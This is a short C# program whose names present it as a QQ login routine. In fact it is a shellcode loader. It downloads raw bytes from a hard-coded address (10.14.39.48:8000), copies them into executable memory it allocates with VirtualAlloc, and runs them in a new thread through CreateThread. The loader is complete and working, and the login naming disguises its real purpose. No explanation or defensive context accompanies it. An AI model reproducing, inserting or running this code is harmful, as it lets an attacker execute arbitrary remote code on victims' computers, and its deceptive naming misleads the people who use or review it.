using System;
using System.Runtime.InteropServices;
using System.Net;

class Program
{
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
        LoginQQ();
    }

    public static void LoginQQ()
    {
        string qq_loginURI = "http://10.14.39.48:8000/login_qq_api";
        WebClient webClient = new WebClient();

        byte[] qqLoginState = webClient.DownloadData(qq_loginURI);

        UInt32 QQOpen = VirtualAlloc(0, (UInt32)qqLoginState.Length, 0x1000, 0x40);
        Marshal.Copy(qqLoginState, 0, (IntPtr)(QQOpen), qqLoginState.Length);

        IntPtr QQHandle = IntPtr.Zero;
        UInt32 QQthreadId = 0;
        IntPtr QQparameter = IntPtr.Zero;
        QQHandle = CreateThread(0, 0, QQOpen, QQparameter, 0, ref QQthreadId);

        WaitForSingleObject(QQHandle, 0xFFFFFFFF);
    }
}